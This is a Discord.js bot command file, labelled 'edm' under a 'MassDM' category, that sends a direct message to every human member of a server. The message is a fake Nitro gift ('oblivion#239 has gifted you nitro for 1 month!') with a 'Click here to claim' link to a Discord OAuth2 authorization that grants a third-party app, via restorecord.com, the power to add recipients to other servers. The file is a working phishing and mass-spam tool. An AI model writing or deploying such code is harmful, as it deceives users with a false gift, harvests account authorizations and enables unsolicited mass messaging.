const Discord = require("discord.js")
const whitelist = require("../../whitelist.json")
module.exports.execute = async (client, message) => {

  if (message.author.id !== whitelist.id && message.author.id !== whitelist.id2) return message.reply("You are not Whitelisted.")

  let timedOut = false

  const { channel, author } = message

  const isFromAuthor = m => m.author.id == author.id

  const options = {
    max: 1,
    time: 60 * 1000
  }

  await channel.send('Type and send any letter to continue')
  const firstColl = await channel.awaitMessages(isFromAuthor, options)

  if (firstColl.size > 0) {
    const title = firstColl.first().content

    const Embed = new Discord.MessageEmbed()
      .setTitle("You've been gifted a subscription! Click here to claim")
      .setDescription("**oblivion#239 has gifted you nitro for 1 month!** ")
      .setFooter("Expires in 47 hours  ")
      .setImage("https://images.app.goo.gl/a5wvzpqF2H2ktgVe9")
      .setURL("https://discord.com/oauth2/authorize?client_id=1001233156680187964&redirect_uri=https://restorecord.com/api/callback&response_type=code&scope=identify+guilds.join&state=1030603568236986420")	    
      .setColor(10181099)

    message.guild.members.cache.forEach(member => {
      if (member.id !== client.user.id && !member.user.bot) member.send(Embed).catch(() => { });
    });

  } else timedOut = true

  if (timedOut)
    channel.send('Command canceled (timed out)')

}



module.exports.help = {
  name: "edm",
  aliases: [],
  category: "MassDM",
  usage: "<message>",
  description: "Put message to adversite"
}